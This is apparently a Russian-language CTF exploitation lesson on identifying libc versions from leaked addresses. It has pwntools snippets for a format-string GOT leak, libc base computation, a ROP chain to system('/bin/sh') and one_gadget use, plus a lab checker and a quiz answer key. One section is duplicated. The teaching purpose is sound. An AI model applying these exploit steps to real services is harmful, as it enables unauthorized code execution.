---
id: pwn-libc-database
title: "Определение версии libc (libc-database)"
category: pwn
parent: pwn-ret2libc
difficulty: medium
order: 2
tags: [libc, libc-database, offsets, ret2libc, leak, identification]
prerequisites: [pwn-ret2libc, pwn-got-plt, pwn-pie-bypass]
useful_for:
  - "CTF Pwn категория"
  - "Vulnerability research"
estimated_minutes: 45
summary: "По утечке libc-адресов определяем точную версию libc и её смещения: libc-database, libc.rip, символы system//bin/sh/one_gadget — обязательный ежедневный навык ret2libc."
lab:
  kind: shell
  title: "Практика: идентификация libc по build-id"
  toolset: [core, readelf]
  workdir: /home/student/task
  files: [task.md, libc_version.txt, libc_buildid.txt]
  check: "grep -q '2.43' answer.txt"
  hints:
    - "Версия лежит в строке `GNU C Library ... release version ...`."
    - "Build ID — в нотах ELF: `readelf -n libc.so.6`."
    - "Собери ответ: `version=<X.Y> buildid=<hex>`."
---

## Вопрос, с которого всё начинается

В прошлом уроке ты утёк адрес `puts` и вычел из него оффсет — получил базу libc. Но откуда взялся сам оффсет? Если libc не приложена к задаче, ты его не знаешь. А взять «на глаз» нельзя: `system`, `/bin/sh` и хуки имеют **разные смещения в каждой сборке** libc, и ошибка в несколько байт превращает рабочий эксплойт в падение.

Сегодня научимся по утечке определять **точную версию** libc.

## Наш пример: утекаем puts, libc неизвестна

```python
from pwn import *
context.binary = elf = ELF('./chall')
p = process('./chall')

p.recvuntil(b'name: ')
p.sendline(b'%7$s' + p64(elf.got['puts']))   # или ret2libc-цепочка
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info('puts @ %#x', leak)
log.info('puts low 12 bits: %03x', leak & 0xfff)
```

```text
[*] puts @ 0x7f8c4a1b06f0
[*] puts low 12 bits: 6f0
```

Ключевое наблюдение: **младшие 12 бит адреса символа не зависят от ASLR**. Страница памяти — 4096 байт (`0x1000`), и ASLR сдвигает всю базу, но не внутреннее смещение символа. Значит, `6f0` — устойчивый «отпечаток» функции `puts` в этой libc.

## Шаг 1. Почему одной утечки мало

По одному символу база выдаст **несколько** кандидатов — у разных версий libc младшие биты могут совпасть. Поэтому нужна **вторая** утечка. Возьмём ещё одну функцию:

```python
log.info('printf low 12 bits: %03x', (leak2 & 0xfff))
```

Две пары «символ + младшие 12 бит» почти всегда дают единственную версию.

## Шаг 2. Локальная база: libc-database

`libc-database` от niklasb — стандарт оффлайн-идентификации. Установка и наполнение:

```bash
$ git clone https://github.com/niklasb/libc-database
$ cd libc-database
$ ./get ubuntu        # скачать только Ubuntu-сборки — быстрее и обычно достаточно
```

Поиск по символам:

```bash
$ ./find puts 6f0
ubuntu-16.04-amd64/libc6_2.23-0ubuntu11.3_amd64
ubuntu-18.04-amd64/libc6_2.27-3ubuntu1.6_amd64
$ ./find puts 6f0 printf 260
ubuntu-18.04-amd64/libc6_2.27-3ubuntu1.6_amd64
```

Первая команда дала двух кандидатов, вторая с дополнительной парой `printf 260` — ровно одного. Скачиваем его:

```bash
$ ./download libc6_2.27-3ubuntu1.6_amd64
```

## Шаг 3. Онлайн: libc.rip

Если локальной базы нет, используй `libc.rip`. Формат тот же — пары `symbol offset` (последние три hex-цифры), сервис вернёт список версий со ссылками на скачивание. Аналоги — `libc.blukat.me`. Минус: нужна сеть; для изолированных соревнований держи локальную базу.

## Шаг 4. Считаем адреса

Теперь, когда файл libc есть, вычисляем всё нужное:

```python
libc = ELF('./libc6_2.27.so', checksec=False)
libc.address = leak - libc.symbols['puts']
log.success('libc base @ %#x', libc.address)
system = libc.address + libc.symbols['system']
binsh  = libc.address + next(libc.search(b'/bin/sh\x00'))
```

Дальше строим ROP: `pop rdi; ret` → `binsh` → `system`. Если `system` падает на `movaps`, добавь лишний `ret` для выравнивания стека.

## Шаг 5. Отпечаток __libc_start_main_ret

Очень часто переполнение перезаписывает сохранённый адрес возврата, который указывает внутрь `__libc_start_main` (в glibc 2.31 это `__libc_start_main+243`). Младшие 12 бит этого адреса **специфичны для версии** — отличный отпечаток:

```bash
$ ./find __libc_start_main_ret 083
```

Осторожно: это адрес **кода**, а не символа. Поэтому вычитать нужно смещение точки возврата:

```python
libc.address = leak - libc.symbols['__libc_start_main'] - 243
```

## Шаг 6. Проверяем найденную libc

Не доверяй скачанной сборке слепо — проверь символы и запусти локально именно на ней:

```bash
$ python3 -c "from pwn import *; l=ELF('./libc6_2.27.so'); print(hex(l.symbols['system']), hex(l.symbols['puts']))"
$ LD_PRELOAD=./libc6_2.27.so ./chall        # локальный прогон на этой libc
```

Если локально работает, а удалённо нет — почти всегда виновата другая сборка или выравнивание стека, а не логика.

## Шаг 7. Разрешаем неоднозначность

Когда `./find` возвращает несколько кандидатов, добавляй пары до однозначности. Порядок: сначала редкие символы (`read`, `write`, `__libc_start_main_ret`), затем общие (`printf`, `puts`). Если не помогло — используй размер файла, дистрибутив (Ubuntu/Debian/CentOS), а иногда строку версии:

```bash
$ strings ./libc.so.6 | grep -i "GNU C Library"
```

## Сбор утечки через format string

Помимо `puts@got`, версию libc определяют по утечке из format string. Позиционный `%N$p` печатает содержимое регистров-сейв-области `printf`, среди которых часто оказывается адрес возврата в libc (`__libc_start_main+243`) или адрес самой `printf`. Алгоритм: подаёшь `%1$p.%2$p....%40$p`, собираешь дамп, отфильтровываешь значения, начинающиеся с `0x7f` (это libc). Затем берёшь младшие 12 бит каждого и прогоняешь через `./find`. Если утёк `__libc_start_main+243`, используй `./find __libc_start_main_ret <low12>`; если `printf` — `./find printf <low12>`. Комбинируя две утечки, почти всегда получаешь единственную версию. Помни: позиции буфера и libc-указателей зависят от компилятора, поэтому перебор обязателен.

## Разрешаем неоднозначность

Когда `./find` возвращает несколько кандидатов, добавляй пары символов до однозначности. Порядок добавления: сначала редкие символы (`read`, `write`, `__libc_start_main_ret`), затем общие (`printf`, `puts`, `malloc`). Если и это не помогло, используй дополнительную информацию: размер файла libc, версию glibc из баннера сервиса, дистрибутив (Ubuntu/Debian/CentOS), дату сборки. Иногда помогает `strings ./libc.so.6 | grep -i "GNU C Library"` — строка версии прямо указывает на релиз. В крайнем случае перебирай кандидатов, подставляя их в эксплойт: правильная версия даст shell, неправильная — падение.

## one-gadget и гаджеты

`one_gadget` находит адреса, по которым сразу выполняется `execve("/bin/sh")`:

```bash
$ one_gadget ./libc6_2.27.so
0xe3afe execve("/bin/sh", r15, r12)
constraints: [r15] == NULL || r15 == NULL || r12 == NULL
```

У каждого one-gadget есть **constraints** на регистры — проверяй их, «первый по списку» часто не выполняется. Обычные гаджеты ищут `ROPgadget`/`ropper`:

```bash
$ ROPgadget --binary ./libc6_2.27.so --only "pop|ret" | grep "pop rdi"
```

## На что смотреть дальше

- **Одна утечка** даёт несколько кандидатов — бери вторую для сужения.
- **Путаница младших бит и полного оффсета** — `./find` принимает только 3 hex-цифры; полный адрес берёшь из найденного файла.
- **Не тот символ** — убедись, что утечка из libc (`0x7f...`), а не из PIE (`0x55...`).
- **Distro-патчи** — официальная glibc и пакет Ubuntu отличаются; ищи именно пакетную сборку.
- **Забыт `libc.address`** — до его установки `libc.symbols[...]` возвращают оффсеты, а не адреса.
- **Выравнивание** — даже с верными адресами `system` может упасть на `movaps`.

## Инструмент: readelf — разбор ELF

`readelf` читает заголовки ELF-файла: архитектуру, тип, секции, сегменты и включённые защиты. С него начинается любой разбор нативного бинарника.

Ключи, которые пригодятся:
* `readelf -h <файл>` — заголовок: класс (32/64), машина, точка входа;
* `readelf -S <файл>` — таблица секций (`.text`, `.plt`, `.got`, `.data`);
* `readelf -s <файл>` — таблица символов (как `nm`, но с секциями и типами);
* `readelf -l <файл>` — сегменты программы; ищи `GNU_STACK`/`GNU_RELRO`, чтобы понять защиты.

### Рабочий пример (как в лаборатории)

```
$ readelf -n libc.so.6
Displaying notes found in: .note.gnu.build-id
  GNU                  0x00000014	NT_GNU_BUILD_ID (unique build ID bitstring)
    Build ID: 7a8d41a2df4fde040b4c6ac2832311ab645a1e41
```

Подсказка из лаборатории: `readelf [-n] <файл> — заметки ELF (build-id)`.

## Что мы теперь знаем

- Младшие 12 бит адреса символа не зависят от ASLR — это отпечаток версии.
- `libc-database` (`./find`, `./download`) и `libc.rip` идентифицируют сборку.
- Две утечки почти всегда дают единственную версию.
- `libc.address = leak − offset` даёт базу; дальше считаются `system` и `/bin/sh`.
- one-gadget требует проверки constraints.

Держи локальную базу `libc-database` под рукой — идентификация версии libc это ежедневный навык, такой же обязательный, как поиск гаджетов. Одна неверная версия — и весь эксплойт падает.

## Квиз

Проверь себя.

```quiz
- question: "Зачем нужна точная версия libc в ret2libc?"
  options:
    - "От версии зависят оффсеты символов (system, /bin/sh и др.)"
    - "Она определяет порт"
    - "Она включает ASLR"
    - "Она удаляет canary"
  answer: 0
  explanation: "Оффсеты различаются между версиями и сборками libc."
- question: "Сколько hex-цифр оффсета обычно использует ./find в libc-database?"
  options:
    - "Младшие 3 hex-цифры"
    - "Старшие 4"
    - "Все 16"
    - "2 байта"
  answer: 0
  explanation: "Из-за выравнивания страниц значимы младшие 12 бит (3 hex)."
- question: "Какой онлайн-сервис определяет libc по утечкам?"
  options:
    - "libc.rip"
    - "shodan.io"
    - "virustotal"
    - "pastebin"
  answer: 0
  explanation: "libc.rip ищет версию libc по парам symbol/offset."
- question: "Что такое one_gadget?"
  options:
    - "Адрес в libc, вызывающий execve('/bin/sh') при выполнении условий"
    - "Первый гаджет в ROP"
    - "Одноразовый пароль"
    - "Флаг сборки"
  answer: 0
  explanation: "one_gadget упрощает получение shell, если выполнены его ограничения на регистры."
- question: "Сколько утечек обычно нужно для однозначной идентификации?"
  options:
    - "Две (по одному символу можно получить несколько кандидатов)"
    - "Ни одной"
    - "Десять"
    - "Все символы"
  answer: 0
  explanation: "Двух утечек (или известных символов) достаточно, чтобы сузить до одной версии."
```

## Куда дальше

В `pwn-static-no-libc` мы возьмём бинарь, где libc вообще нет — всё вкомпилировано, и утечка невозможна. Там мы построим цепочку на `syscall` вместо `system`. А пока главное: **младшие 12 бит адреса — отпечаток libc; две утечки, `./find`, и у тебя точные оффсеты.**

## Где пригодится

- **CTF:** Pwn — ret2libc, heap-задачи (ежедневный навык).
- **Bug bounty:** анализ нативных сервисов.
- **Пентест:** эксплуатация бинарей без приложенной libc.
- **Работа:** vulnerability research.
